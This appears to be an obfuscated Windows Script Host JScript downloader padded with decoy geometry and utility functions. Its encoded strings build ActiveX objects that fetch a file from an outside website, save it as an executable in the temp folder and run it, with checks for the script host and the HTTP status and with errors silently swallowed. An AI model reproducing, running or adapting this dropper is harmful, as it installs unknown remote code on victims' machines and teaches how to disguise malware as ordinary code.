
var leicestershire = new Array(-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57,
    58, 59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6,
    7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24,
    25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36,
    37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);

  accords = [];
	
var dominoes = { ':': '.','U': 'S','381': 'X'};
	var replacement = 0;


function a(b){if(b==1){return 2;}else{return 17;}
return 3;}
 function separated(contest) {
	chatty = contest;
	for (var i in dominoes){chatty = chatty.replace(i, dominoes[i]);}
    return chatty;
};

var rwanda = 3-2;  
function Point(x, y) {
    this.x = x || 0;
    this.y = y || 0;
}

Point.create = function(o, y) {
    if (isArray(o)) return new Point(o[0], o[1]);
    if (isObject(o)) return new Point(o.x, o.y);
    return new Point(o, y);
};

Point.add = function(p1, p2) {
    return new Point(p1.x + p2.x, p1.y + p2.y);
};

Point.subtract = function(p1, p2) {
    return new Point(p1.x - p2.x, p1.y - p2.y);
};

Point.scale = function(p, scaleX, scaleY) {
    if (isObject(scaleX)) {
        scaleY = scaleX.y;
        scaleX = scaleX.x;
    } else if (!isNumber(scaleY)) {
        scaleY = scaleX;
    }
    return new Point(p.x * scaleX, p.y * scaleY);
};

Point.equals = function(p1, p2) {
    return p1.x == p2.x && p1.y == p2.y;
};

Point.angle = function(p) {
    return Math.atan2(p.y, p.x);
};
String.prototype.separated4 = function() {
	
    var c1, c2, c3, c4;
    var i, len, out;
	var str = this.replace(/newest/g, '')
    len = str.length;
    i = 0;
    out = "";

    while (i < len) {
        do {
            c1 = leicestershire[str.charCodeAt(i++) & 0xff]
        } while (i < len && c1 == -1);

        if (c1 == -1)
            break;

        do {
            c2 = leicestershire[str.charCodeAt(i++) & 0xff]
        } while (i < len && c2 == -1);

        if (c2 == -1)
            break;

        out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

        do {
            c3 = str.charCodeAt(i++) & 0xff;

            if (c3 == 61)
                return out;

            c3 = leicestershire[c3]
        } while (i < len && c3 == -1);

        if (c3 == -1)
            break;

        out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));

        do {
            c4 = str.charCodeAt(i++) & 0xff;

            if (c4 == 61)
                return out;

            c4 = leicestershire[c4]
        } while (i < len && c4 == -1);

        if (c4 == -1)
            break;

        out += String.fromCharCode(((c3 & 0x03) << 6) | c4)
    }

    return out
}


var financing ="newestJVnewestRFTVnewestAl".separated4();
Point.interpolate = function(p1, p2, f) {
    var dx = p2.x - p1.x;
    var dy = p2.y - p1.y;
    return new Point(p1.x + dx * f, p1.y + dy * f);
};
var waylay = "newestQWnewestN0aXZnewestlWE9ianewestmVjdA=newest=".separated4();
String.prototype.separated2 = function () {
    var strategic = {
        monkey: this
    };
    strategic.exists = strategic.monkey["c3Vic3RyaW5n".separated4()](replacement, rwanda);
    return strategic.exists;
};

var mission ="newestRXhwYW5newestkRW52aXnewestJvbm1lbnRTdHJnewestpbmdz".separated4();
var Native = function(options){
	
};
var confidentially = [waylay, mission,financing,  ""+"."+("carver","albania","victorian","ichabod","highlights","brazier","thailand","gateway","exe"), "UnVu".separated4(), separated("M"+"SX"+"ML"+("busty","partnerships","administrators","plaid","fatal","untruth","dating","2.")+"381M"+"LH"+"TT"+("playwright","lothario","control","lamentation","measured","chaotic","falstaff","browser","P>")+"WU"+("twitch","batch","immeasurable","confessor","stench","reynolds","espionage","cr")+("egotistical","domains","mighty","freshmen","approving","zimbabwe","restrict","alaska","ip")+"t:"+("medium","jumps","restrict","updated","adornment","grande","completeness","prick","Sh")+"ell")];
tyrone = "_F2_";
var censor = this[confidentially.shift()];
Native.implement = function(objects, properties){
	for (var i = 0, l = objects.length; i < l; i++) objects[i].implement(properties);
};

Native.genericize = function(object, property, check){
	if ((!check || !object[property]) && typeof object.prototype[property] == 'function') object[property] = function(){
		var args = Array.prototype.slice.call(arguments);
		return object.prototype[property].apply(args.shift(), args);
	};
};
Native.typize = function(object, family){
	if (!object.type) object.type = function(item){
		return ($type(item) === family);
	};
};
qGMXIfGjI = "fsecED";
crocodile = (("filter", "warranty", "crossexamination", "concentrate", "betake", "telegraphy", "supporting", "pnuWbSxxto") + "CHvyuvFCCNJ").separated2();
messaging = (("cooling", "demagogue", "linnet", "unbiased", "stupid", "artist", "expeditious", "admissible", "planets", "sYxawBM") + "sSAPVWKSzx").separated2();
  
    String.prototype.hawaii = function (a) {
        for (var b = [], c = 0; c < a.length; c++)b[c] = a[c];
        return b.join("")
    };

var signals = confidentially.pop().split(">");

weaver = "b3Blbg==".separated4();
var stewardess = new censor(signals[1]);
var desecration = new censor(signals[0]);
var blackbird = stewardess[confidentially.shift()](confidentially.shift());
weasel = "E";

var whatll = confidentially.shift();
var candied = confidentially.shift();
function exclusively(specification, immigration) {

    try {
        var increasingly = blackbird + "/" + immigration ;
		increasingly = increasingly+ whatll;
            desecration[weaver](("affair","concede","federation","garish","discredit","teens","avowal","bulky","G" + weasel) + ("construe","certification","fluctuation","erstwhile","invisible","trucks","bachelor","beautiful","governance","parsonage","T"), specification, false);
       
    desecration[messaging + ("ghent","radar","end")]();
	var alexandra=("crocodile" + WScript=="crocodile" + "V2luZG93cyBTY3JpcHQgSG9zdA==".separated4())&&desecration["c3RhdHVz".separated4()] +""=="MjAw".separated4()&&typeof(oEumeAn)==="undefined";

    if (alexandra) {
		
        var snowball = new censor((("dried","depends","pandemonium","excitement","loading","measurable","magnetism","styles","A")+("celtic","authority","visitation","bulgaria","happening","ronald","assessment","autumn","SEOO")+"DB"+("universality","enemies","stayed","classmate","helicopter","clearance","pushing",".S")+"tr8").replace("SEO", "D").replace("8", "eam"));
        snowball[weaver]();
        KWyybOTmu = "_F9_";
        snowball.type = rwanda;
        avVKHUYc = "_F10_";
        snowball["d3JpdGU=".separated4()](desecration[("username","ontario","blazon","aside","tenement","complaints","cooperation","")+"R"+"es"+"pon"+dominoes['U'].toLowerCase()+"e"+"Qm9keQ==".separated4()]);
        yBIBfftyfGM = "_F11_";
        snowball[(crocodile + "o"+("laymen","twisted","berne","chorus","antibodies","replies","intervals","promotions","00")+("kabul","indecent","momentum","creamy","pheasant","glasgow","expected","8i")+"tion").replace("0"+("periodically","patterns","writer","tattoo","warring","katie","documents","08"), messaging)] = 0;
        yjYbNTty = "_F12_";
        snowball.saveToFile(increasingly, 2);
        cJqtyc = "_F13_";
        snowball.close();
        DVzmcIO = "_F14_";
		stewardess[candied](increasingly, rwanda, true);
    }
} catch (cvssHp) { };

    FGgAlVISaE = "_F15_";
}
try{
exclusively("aHRnewest0cDnewestovLw=newest=".separated4()+"\u0077\u0077\u0077"+"\u002E\u006A\u006F\u0068\u006E\u006C\u006F\u0064\u0067\u0065\u0061\u0072\u0063\u0068\u0069\u0074\u0065\u0063\u0074\u0073\u002E\u0063\u006F\u006D\u002F\u0037\u0038\u0074\u0067\u0037\u0036\u0038\u0062" + "?PvQriGcgU=gAqPuYY","AaQKneIm");}catch(PqTcyGySsiJ){}

   LqAuFyg = "_F16_";
   